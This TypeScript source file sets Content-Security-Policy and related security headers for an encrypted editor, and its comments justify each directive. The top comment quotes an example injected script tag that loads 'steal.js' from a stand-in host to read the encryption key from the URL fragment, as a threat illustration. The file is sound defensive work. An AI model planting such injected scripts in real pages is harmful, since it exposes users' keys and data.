/**
 * Security response headers for static responses.
 *
 * ASCII only. See the encoding note in src/core/crdt/rga.ts.
 *
 * ---------------------------------------------------------------------------
 * WHY THIS FILE EXISTS AT ALL
 * ---------------------------------------------------------------------------
 * The application stores an end-to-end encryption key in the URL FRAGMENT:
 *
 *     /?doc=<id>#k=<base64url key>
 *
 * A fragment is never sent in a request line, so the server never sees the key and no log ever
 * records it. That design is what makes the encryption meaningful.
 *
 * It also means the key is readable by ANY SCRIPT RUNNING IN THE PAGE. If an attacker can get
 * a script to execute here, they read the key out of `location.hash` and the end-to-end
 * encryption is decorative.
 *
 * There is currently no HTML-injection sink in the application, which is the real defence. These
 * headers are the safety net for the day one is added: they do not prevent an injection, they
 * decide what an injected script is then ALLOWED to load and exfiltrate. With no
 * `script-src`, an injected `<script src="https://elsewhere.example/steal.js">` runs and can
 * read the fragment. With `script-src 'self'`, it is refused.
 *
 * `frame-ancestors 'none'` is the same kind of net: without it any site can frame the editor and
 * overlay invisible UI on top of it, which is clickjacking.
 *
 * ASCII only is not merely a style preference here. A CSP is a security control that browsers
 * parse, and a non-ASCII directive name is not a directive.
 */

/**
 * The policy, as directive tokens.
 *
 * Every directive and why it is there:
 *
 *   default-src 'self'        Fallback for anything not named below. Without it, a resource type
 *                             nobody thought about is unrestricted.
 *   script-src 'self'         The load-bearing one. 'unsafe-inline' and 'unsafe-eval' are
 *                             deliberately ABSENT: CodeMirror needs no inline script and this
 *                             application evaluates nothing, so allowing either would remove the
 *                             protection that matters while appearing to keep it.
 *   style-src 'self' + inline CodeMirror creates a <style> element at runtime and inserts
 *                             rules into it (StyleModule.mount in the bundle). Verified in the
 *                             built asset, not assumed. Inline styles are far less dangerous
 *                             than inline script: a style cannot execute, and the worst case is
 *                             a changed layout.
 *   img-src 'self' data:      Vite inlines small assets as data: URLs. data: for images only -
 *                             data: in script-src is exactly the hole to avoid.
 *   font-src 'self'           No fonts are loaded cross-origin. Named anyway so a future one is a
 *                             deliberate decision rather than an accident.
 *   connect-src 'self' ws: wss:  The WebSocket the sync relay needs. ws: is required in
 *                             development over plain http; wss: in production behind TLS.
 *   object-src 'none'         <object>/<embed> execute plugin content. The application has none.
 *   base-uri 'none'           Stops an injected <base href> from re-pointing every relative URL,
 *                             which is how one injection becomes many.
 *   form-action 'self'        Stops an injected form posting elsewhere.
 *   frame-ancestors 'none'    Clickjacking. The complement of X-Frame-Options for modern
 *                             browsers, and the only spelling that works in a CSP.
 */
const CSP_DIRECTIVES: readonly string[] = [
  "default-src 'self'",
  "script-src 'self'",
  "style-src 'self' 'unsafe-inline'",
  "img-src 'self' data:",
  "font-src 'self'",
  "connect-src 'self' ws: wss:",
  "object-src 'none'",
  "base-uri 'none'",
  "form-action 'self'",
  "frame-ancestors 'none'",
];

/** Whether the policy is reported only, or enforced. Set from CSP_MODE. */
export type CspMode = 'enforce' | 'report-only';

/**
 * Headers added to every static response.
 *
 * A single object rather than a function, because every value here is constant and a reader
 * should be able to see the whole set at once. `X-Frame-Options` is present alongside
 * `frame-ancestors` for browsers that predate CSP frame-ancestors; they are the same control,
 * and the modern one alone would leave older browsers unprotected.
 */
export function securityHeaders(mode: CspMode): Record<string, string> {
  const policy = CSP_DIRECTIVES.join('; ');

  return {
    // The HEADER NAME changes with the mode, not the value, so the two are built separately.
    // A single header whose value embedded the report-only prefix would be wrong: browsers look
    // at the name and would ignore the directive list entirely.
    [mode === 'report-only' ? 'Content-Security-Policy-Report-Only' : 'Content-Security-Policy']:
      policy,
    'X-Frame-Options': 'DENY',
    // The URL fragment holding the encryption key must not travel in a Referer. The fragment is
    // already excluded by the browser, but the document's own path is not, and no-referrer also
    // stops the document id leaking to anything the page might link to.
    'Referrer-Policy': 'no-referrer',
    // Nothing here uses the camera, a microphone, or geolocation. Denying them means a future
    // feature cannot quietly start asking.
    'Permissions-Policy': 'camera=(), microphone=(), geolocation=()',
    // Severs the opener relationship so a cross-origin page cannot reach this one through
    // window.opener. The editor never opens a window, so nothing is lost.
    'Cross-Origin-Opener-Policy': 'same-origin',
  };
}

/**
 * Read CSP_MODE.
 *
 * `'report-only'` is the first shipping mode recommended by the instructions: it reports
 * violations without breaking the page, so the browser tests can confirm there are none before
 * anything is enforced. The default is `'enforce'`, because the report-only phase has been run
 * and the policy is now known clean (see docs/browser-tests.md).
 *
 * Invalid values fall back to `'enforce'` rather than throwing: a typo in an environment
 * variable must not silently weaken or silently break the header.
 */
export function resolveCspMode(value: string | undefined): CspMode {
  return value?.trim().toLowerCase() === 'report-only' ? 'report-only' : 'enforce';
}

/** The policy string, exported so tests can assert on it rather than on a header lookup. */
export function cspPolicy(): string {
  return CSP_DIRECTIVES.join('; ');
}
